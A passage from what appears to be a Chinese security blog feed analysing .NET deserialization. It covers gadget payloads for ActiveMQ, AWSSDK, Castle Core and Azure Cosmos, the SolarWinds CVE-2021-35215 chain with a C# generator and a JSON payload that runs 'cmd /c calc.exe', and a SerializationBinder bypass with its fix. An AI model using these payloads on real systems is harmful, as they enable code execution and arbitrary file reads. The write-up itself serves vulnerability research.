AssemblyInstaller</p><p><img src="../images/image-20240417211809604.png" alt="image-20240417211809604"></p><p>这里的话是进行赋值操作</p><p><img src="../images/image-20240417211905393.png" alt="image-20240417211905393"></p><p>CompiledAssembly getter  其就会加载我们上面赋值的那个pathToAssembly参数</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;System.CodeDom.Compiler.CompilerResults, System.CodeDom, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51&quot;,</span><br><span class="line">    &quot;tempFiles&quot;: null,</span><br><span class="line">    &quot;PathToAssembly&quot;: &quot;C:\\Users\\Public\\mixedassembly.dll&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意自 .NET Framework 4 开始禁止通过 Assembly.Load 加载远程 DLL, 因此需要与写文件 Gadget 结合</p><h1 id="第三方库"><a href="#第三方库" class="headerlink" title="第三方库"></a>第三方库</h1><h2 id="ActiveMQObjectMessage"><a href="#ActiveMQObjectMessage" class="headerlink" title="ActiveMQObjectMessage"></a>ActiveMQObjectMessage</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache.NMS.ActiveMQ</span><br></pre></td></tr></table></figure><h3 id="lt-2-1-0版本"><a href="#lt-2-1-0版本" class="headerlink" title="&lt;2.1.0版本"></a>&lt;2.1.0版本</h3><p>序列化时触发 Binary Formatter 反序列化, 兼容大多数基于 setter 的序列化器</p><p>这个玩意序列化的时候还挺简单</p><p><img src="../images/image-20240417214503692.png" alt="image-20240417214503692"></p><p><img src="../images/image-20240417214517125.png" alt="image-20240417214517125"></p><p>其Formatter默认是BinaryFormatter、</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;Apache.NMS.ActiveMQ.Commands.ActiveMQObjectMessage, Apache.NMS.ActiveMQ, Version=2.0.1.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;,</span><br><span class="line">    &quot;Content&quot;: &quot;base64encoded-binaryformatter-gadget&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-0版本"><a href="#2-1-0版本" class="headerlink" title="2.1.0版本"></a>2.1.0版本</h3><p><img src="../images/image-20240417214705912.png" alt="image-20240417214705912"></p><p>其实就是多了这一行代码</p><p>2.1.0 版本增加了 TrustedClassFilter (SerializationBinder), 需要指定 Connection.DeserializationPolicy</p><p>但是对于序列化 gadget 没有影响, 自己手动构造将 DeserializationPolicy 设置为 null 就行</p><p><img src="../images/image-20240417215234206.png" alt="image-20240417215234206"></p><p>POC</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;$type&quot;</span>: <span class="string">&quot;Apache.NMS.ActiveMQ.Commands.ActiveMQObjectMessage, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content&quot;</span>: <span class="string">&quot;base64-encoded-binaryformatter-gadget&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;connectionUri&quot;</span>: <span class="string">&quot;http://localhost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;transport&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$type&quot;</span>: <span class="string">&quot;Apache.NMS.ActiveMQ.Transport.Failover.FailoverTransport, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;clientIdGenerator&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$type&quot;</span>: <span class="string">&quot;Apache.NMS.ActiveMQ.Util.IdGenerator, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="OptimisticLockedTextFile"><a href="#OptimisticLockedTextFile" class="headerlink" title="OptimisticLockedTextFile"></a>OptimisticLockedTextFile</h2><p>Amazon AWSSDK.Core</p><p>序列化时可以读取任意文件, 但是需要通过序列化来接收文件内容</p><p><img src="../images/image-20240417215958166.png" alt="image-20240417215958166"></p><p>构造函数传入filepath  然后调用read()函数</p><p><img src="../images/image-20240417220050410.png" alt="image-20240417220050410"></p><p>读取文件内容传入OriginalContents和Lines中去</p><p>paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;Amazon.Runtime.Internal.Util.OptimisticLockedTextFile, AWSSDK.Core, Version=3.3.0.0, Culture=neutral, PublicKeyToken=885c28607f98e604&quot;,</span><br><span class="line">    &quot;filePath&quot;: &quot;C:\\Windows\\win.ini&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240417220244090.png" alt="image-20240417220244090"></p><p>因为其实private</p><h2 id="CustomUri"><a href="#CustomUri" class="headerlink" title="CustomUri"></a>CustomUri</h2><p>位于 Castle Core</p><p>反序列化时会调用 Environment.ExpandEnvironmentVariables 解析 resourceIdentifier 中的环境变量</p><p>同样需要通过序列化来接收数据</p><p><img src="../images/image-20240417221142806.png" alt="image-20240417221142806"></p><p><img src="../images/image-20240417221159715.png" alt="image-20240417221159715"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;Castle.Core.Resource.CustomUri, Castle.Core, Version=5.0.0.0, Culture=neutral, PublicKeyToken=407dd0808d44fbdc&quot;,</span><br><span class="line">    &quot;resourceIdentifier&quot;: &quot;C:\\test\\%PATHEXT%&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="QueryPartitionProvider"><a href="#QueryPartitionProvider" class="headerlink" title="QueryPartitionProvider"></a>QueryPartitionProvider</h2><p>位于 Microsoft Azure.Core</p><p>在反序列化时触发 Json.Net 序列化, 可以与上面的序列化 Gadget 相结合</p><p><img src="../images/image-20240417222510921.png" alt="image-20240417222510921"></p><p>其构造函数可以进行Json.Net序列化操作  那么可以配合上面的Gadget来打</p><p>例如与 ActiveMQObjectMessage 结合</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;Microsoft.Azure.Cosmos.Query.Core.QueryPlan.QueryPartitionProvider, Microsoft.Azure.Cosmos.Client, Version=3.32.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;,</span><br><span class="line">    &quot;queryengineConfiguration&quot;: &#123;</span><br><span class="line">        &quot;poc&quot;: &#123;</span><br><span class="line">            &quot;$type&quot;: &quot;Apac he.NMS.ActiveMQ.Commands.ActiveMQObjectMessage, Apache.NMS.ActiveMQ, Version=2.0.1.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;,</span><br><span class="line">            &quot;Content&quot;: &quot;base64-encoded-binaryformatter-gadget&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化的时候刚好调用ActiveMQObjectMessage这个类中的getter方法  然后就会触发里面的反序列化操作</p><p><strong><a href="https://exp10it.io/2024/02/dotnet-new-deserialization-gadgets/#xamlimageinfo">https://exp10it.io/2024/02/dotnet-new-deserialization-gadgets/#xamlimageinfo</a>  xz总结的Gadgets  就不重新开文章了  直接写就行了</strong></p><p><strong>可以配合我们这一篇文章来看</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2024/02/dotnet-insecure-serialization/#securityexception&quot;&gt;https://exp10it.io/2024/02/dotnet-insecure-serializ</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>SolarWinds-ActionPluginBaseView-反序列化(CVE-2021–35215)</title>
    <link href="https://ke1nys.github.io/posts/2945e9c.html"/>
    <id>https://ke1nys.github.io/posts/2945e9c.html</id>
    <published>2024-04-14T13:19:00.000Z</published>
    <updated>2024-04-18T12:57:04.536Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://exp10it.io/2024/02/solarwinds-orion-platform-actionpluginbaseview-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135215/">https://exp10it.io/2024/02/solarwinds-orion-platform-actionpluginbaseview-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135215/</a></p><p><a href="https://xz.aliyun.com/t/10412?time__1311=mq%2BxBDyDcDuWKGNDQi4%2B0Ybwe7whDGIix">https://xz.aliyun.com/t/10412?time__1311=mq%2BxBDyDcDuWKGNDQi4%2B0Ybwe7whDGIix</a></p><p><a href="https://testbnull.medium.com/50-shades-of-solarwinds-orion-deserialization-part-1-cve-2021-35215-2e5764e0e4f2">https://testbnull.medium.com/50-shades-of-solarwinds-orion-deserialization-part-1-cve-2021-35215-2e5764e0e4f2</a></p><p>这里的话就直接用他们图里的照片了  就不搭建环境了  因为有点麻烦 </p><p><strong>(看这个漏洞的时候可以先看看之前的Json.Net和JavaScriptSerializer  有助于这个漏洞的理解)</strong></p><p><img src="../images/image-20240415153336206.png" alt="image-20240415153336206"></p><p>我们从这开始吧   注意这个control的获取和传参  注意这两点对于我们下面的理解帮助很大</p><p><img src="../images/image-20240415153654537.png" alt="image-20240415153654537"></p><p>加载 control 对象后调用 ApplyPropertiesAndAttributes方法</p><p>获取 config 的内容, 然后传入 SetProperties</p><p><img src="../images/image-20240415153753112.png" alt="image-20240415153753112"></p><p>这里就是关键了   这个SetProperty函数就会调用我们传入的obj(就是control的setter方法)</p><p><img src="../images/image-20240415153918334.png" alt="image-20240415153918334"></p><p>仔细跟进这个setProperty方法的话  就会进入到这个SetValue方法中  然后就会在这个setMethod.Invoke调用</p><p>回到最初的地方仔细看  这个obj就是从我们传入的数据中获取的control类  所以这个类可控</p><p><img src="../images/image-20240415154307211.png" alt="image-20240415154307211"></p><p>那么就刚好对应上了作者说的这个东西</p><p>找一个可以利用setter进行RCE或写文件的control类</p><p><img src="../images/image-20240415154817562.png" alt="image-20240415154817562"></p><p>这个就是找到的一个可用的Control类 且setter方法可以进行利用</p><p><img src="../images/image-20240415154912028.png" alt="image-20240415154912028"></p><p>其setter方法</p><p><img src="../images/image-20240415154932599.png" alt="image-20240415154932599"></p><p>内部使用 Json.Net 的 JsonConvert.DeserializeObject 进行反序列化, 并且开启了 TypeNameHandling</p><p>并且他他要求的反序列化对象还得是<code>AlertingActionContext</code></p><p>这个对象就是ActionPluginBaseView这个control类的属性  可以控制  我们看看有没有object属性的参数可以利用</p><p>因为反序列化成对象的时候   就会触发我们object属性的恶意代码  其他属性不行</p><p><img src="../images/image-20240415155212969.png" alt="image-20240415155212969"></p><p>反正就是一直往下找  找到了这个属性  是字典的  并且存着object对象</p><p><img src="../images/image-20240415155346060.png" alt="image-20240415155346060"></p><p>这就解释完了 </p><p><img src="../images/image-20240415155414352.png" alt="image-20240415155414352"></p><p>最终POC</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> SolarWinds.InformationService.Contract2;</span><br><span class="line"><span class="keyword">using</span> SolarWinds.Orion.Core.Models.Actions.Contexts;</span><br><span class="line"><span class="keyword">using</span> SolarWinds.Orion.Core.Models.MacroParsing;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Web.Script.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SolarWindsDemo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            PropertyBag propertyBag = <span class="keyword">new</span> PropertyBag();</span><br><span class="line">            propertyBag.Add(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;&lt;ObjectDataProvider-payload&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            SwisEntityContext swisEntityContext = <span class="keyword">new</span> SwisEntityContext();</span><br><span class="line">            swisEntityContext.EntityProperties = propertyBag;</span><br><span class="line"></span><br><span class="line">            MacroContext macroContext = <span class="keyword">new</span> MacroContext();</span><br><span class="line">            macroContext.Add(swisEntityContext);</span><br><span class="line"></span><br><span class="line">            AlertingActionContext alertingActionContext = <span class="keyword">new</span> AlertingActionContext();</span><br><span class="line">            alertingActionContext.MacroContext = macroContext;</span><br><span class="line"></span><br><span class="line">            JsonSerializerSettings settings = <span class="keyword">new</span> JsonSerializerSettings()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeNameHandling = TypeNameHandling.Objects,</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> viewContextJsonString = JsonConvert.SerializeObject(alertingActionContext, settings);</span><br><span class="line">            Console.WriteLine(viewContextJsonString);</span><br><span class="line"></span><br><span class="line">            Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt; props = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;();</span><br><span class="line">            props.Add(<span class="string">&quot;EnviromentType&quot;</span>, <span class="string">&quot;Alerting&quot;</span>);</span><br><span class="line">            props.Add(<span class="string">&quot;ViewContextJsonString&quot;</span>, <span class="string">&quot;viewContextJsonString&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt; dict = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;();</span><br><span class="line">            dict.Add(<span class="string">&quot;Control&quot;</span>, <span class="string">&quot;SolarWinds.Orion.Web.Actions.ActionPluginBaseView&quot;</span>);</span><br><span class="line">            dict.Add(<span class="string">&quot;config&quot;</span>, props);</span><br><span class="line"></span><br><span class="line">            JavaScriptSerializer javaScriptSerializer = <span class="keyword">new</span> JavaScriptSerializer();</span><br><span class="line">            <span class="built_in">string</span> data = javaScriptSerializer.Serialize(dict);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;Control&quot;</span><span class="punctuation">:</span> <span class="string">&quot;~/Orion/Actions/Controls/CustomPropertyView.ascx&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;EnviromentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Alerting&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;ViewContextJsonString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;\&quot;$type\&quot;:\&quot;SolarWinds.Orion.Core.Models.Actions.Contexts.AlertingActionContext, SolarWinds.Orion.Actions.Models\&quot;,\&quot;ExecutionMode\&quot;:0,\&quot;EnviromentType\&quot;:0,\&quot;EntityType\&quot;:null,\&quot;EntityUri\&quot;:null,\&quot;EntityUris\&quot;:null,\&quot;IsGlobalAlert\&quot;:false,\&quot;AlertContext\&quot;:&#123;\&quot;$type\&quot;:\&quot;SolarWinds.Orion.Core.Models.Actions.Contexts.AlertContext, SolarWinds.Orion.Actions.Models\&quot;,\&quot;AlertName\&quot;:null,\&quot;CreatedBy\&quot;:null&#125;,\&quot;AlertActiveId\&quot;:null,\&quot;AlertObjectId\&quot;:null,\&quot;NetObjectData\&quot;:null,\&quot;ObjectDataExists\&quot;:false,\&quot;MacroContext\&quot;:&#123;\&quot;$type\&quot;:\&quot;SolarWinds.Orion.Core.Models.MacroParsing.MacroContext, SolarWinds.Orion.Core.Models.V1\&quot;,\&quot;contexts\&quot;:[&#123;\&quot;$type\&quot;:\&quot;SolarWinds.Orion.Core.Models.MacroParsing.SwisEntityContext, SolarWinds.Orion.Core.Models.V1\&quot;,\&quot;DisplayName\&quot;:\&quot;Net object properties\&quot;,\&quot;EntityType\&quot;:null,\&quot;EntityUri\&quot;:null,\&quot;EntityProperties\&quot;:&#123;\&quot;$type\&quot;:\&quot;SolarWinds.InformationService.Contract2.PropertyBag, SolarWinds.InformationService.Contract2\&quot;,\&quot;test\&quot;:&#123;\&quot;$type\&quot;:\&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\&quot;,\&quot;MethodName\&quot;:\&quot;Start\&quot;,\&quot;MethodParameters\&quot;:&#123;\&quot;$type\&quot;:\&quot;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\&quot;,\&quot;$values\&quot;:[\&quot;cmd\&quot;,\&quot;/c calc.exe\&quot;]&#125;,\&quot;ObjectInstance\&quot;:&#123;\&quot;$type\&quot;:\&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\&quot;&#125;&#125;&#125;&#125;]&#125;&#125;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>很有意思的一个洞</p><p><strong>SolarWinds Patch Manager WSAsyncExecuteTasks 反序列化 (CVE-2021–35217)</strong></p><p><strong><a href="https://exp10it.io/2024/02/solarwinds-patch-manager-wsasyncexecutetasks-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135217/">https://exp10it.io/2024/02/solarwinds-patch-manager-wsasyncexecutetasks-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135217/</a></strong> </p><p><strong>这个CVE其实也差不多</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2024/02/solarwinds-orion-platform-actionpluginbaseview-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135215/&quot;&gt;h</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>dotnet-SerializationBinder 绕过</title>
    <link href="https://ke1nys.github.io/posts/bc45ee55.html"/>
    <id>https://ke1nys.github.io/posts/bc45ee55.html</id>
    <published>2024-04-13T15:39:31.000Z</published>
    <updated>2024-04-18T12:57:04.538Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://y4er.com/posts/dotnet-deserialize-bypass-binder/#cve-2022-23277-of-exchange">https://y4er.com/posts/dotnet-deserialize-bypass-binder/#cve-2022-23277-of-exchange</a>  (Binder原理)</p><p><a href="https://exp10it.io/2024/02/dotnet-serializationbinder-%E7%BB%95%E8%BF%87/">https://exp10it.io/2024/02/dotnet-serializationbinder-%E7%BB%95%E8%BF%87/</a>   (Binder原理加绕过方法)</p><p>这两篇文章写的很好了  我就写一点点就行了</p><h1 id="SerializationBinder"><a href="#SerializationBinder" class="headerlink" title="SerializationBinder"></a>SerializationBinder</h1><p>我就来跟一下这个<code>SerializationBinder</code>吧  写一下流程  说明一下<code>Binder</code>使用不当造成绕过</p><p>Binder和java中的那个resovleclass过滤黑名单差不多  </p><p>.Net中是使用Binder来进行过滤的</p><p><strong>Demo</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Serialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            RCE calc = <span class="keyword">new</span> RCE(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            binaryFormatter.Serialize(memoryStream, calc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            binaryFormatter.Binder = <span class="keyword">new</span> MyBinder();</span><br><span class="line">            <span class="built_in">object</span> v = binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            Console.WriteLine(v);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">RCE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> cmd;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">$&quot;exec cmd:<span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">MyBinder</span> : <span class="title">SerializationBinder</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Type <span class="title">BindToType</span>(<span class="params"><span class="built_in">string</span> assemblyName, <span class="built_in">string</span> typeName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;assemblyName:<span class="subst">&#123;assemblyName&#125;</span>,typeName:<span class="subst">&#123;typeName&#125;</span>.&quot;</span>);</span><br><span class="line">            Type typeToDeserialize = Type.GetType(String.Format(<span class="string">&quot;&#123;0&#125;, &#123;1&#125;&quot;</span>, typeName, assemblyName));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (typeToDeserialize.Equals(<span class="keyword">typeof</span>(RCE)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//throw new Exception(&quot;can&#x27;t deseriliza rce class.&quot;);</span></span><br><span class="line">                Console.WriteLine(<span class="string">&quot;can&#x27;t deseriliza rce class.&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> typeToDeserialize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240414170206206.png" alt="image-20240414170206206"></p><p>自己定义一个可以进行反序列化的类</p><p><img src="../images/image-20240414170242423.png" alt="image-20240414170242423"></p><p>自己写个Binder来进行定义 如果匹配到RCE这个类就禁止进行反序列化操作 </p><p><strong>(简单点说  如果能让<code>BindToType</code>这个类返回我们序列化的类的话   就能进行反序列化操作)</strong></p><p><img src="../images/image-20240414170345077.png" alt="image-20240414170345077"></p><p>序列化和反序列化操作</p><p><img src="../images/image-20240414170632975.png" alt="image-20240414170632975"></p><p>这里就是有个奇怪的点了  就是我们明明在BindToType这个的函数的时候  匹配到了RCE这个类  return null了  为什么还能进行反序列化操作  我们给BindToType这个函数下个断点来进行分析</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="../images/image-20240414171101772.png" alt="image-20240414171101772"></p><p>因为这里呢  在刚开始的时候 匹配到了我们的RCE类 然后return null了  那么type的值就是null了  所以进行到下面的if判断中  进入到FastBindToType中</p><p><img src="../images/image-20240414171406086.png" alt="image-20240414171406086"></p><p>先根据TypeName中缓存中获取assemblyName  这里是没获取到 接着往下看</p><p><img src="../images/image-20240414171630245.png" alt="image-20240414171630245"></p><p><img src="../images/image-20240414171614670.png" alt="image-20240414171614670"></p><p>这里的bSimple默认值为true </p><p><img src="../images/image-20240414171740943.png" alt="image-20240414171740943"></p><p>最后通过这里拿到了我们的assemblyName了  第一个从缓存中没拿到  然后第二次在这拿到了</p><p><img src="../images/image-20240414171953627.png" alt="image-20240414171953627"></p><p>最后呢 在断点处拿到了这个type值  然后赋值给typeNassembly.type  最后return返回  那么我们的BindToType函数还是回去到我们最终想要回去到Type值  所以就能反序列化成功  这样的话就没有受限于这个Binder的限制 </p><p>修复方法就是在匹配的时候直接抛出异常  不返回null</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p><img src="../images/image-20240414172245670.png" alt="image-20240414172245670"></p><p>这样子的话就能成功过滤黑名单  不会被绕过</p><p>其他绕过方法的话就看xz写的那个文章了  这里就不写了</p><p><a href="https://exp10it.io/2024/02/dotnet-serializationbinder-%E7%BB%95%E8%BF%87/">https://exp10it.io/2024/02/dotnet-serializationbinder-%E7%BB%95%E8%BF%87/</a></p>]]></content>
    
    
